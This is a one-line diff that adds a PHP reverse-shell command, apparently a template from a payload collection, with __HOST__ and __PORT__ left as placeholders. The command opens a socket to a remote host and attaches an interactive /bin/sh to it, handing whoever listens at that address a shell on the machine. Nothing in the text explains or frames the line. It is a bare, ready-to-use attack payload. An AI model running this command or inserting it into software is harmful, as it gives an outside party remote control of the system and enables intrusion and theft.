@@ -1,0 +1,1 @@
+php -r '$sock=fsockopen("__HOST__",__PORT__);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
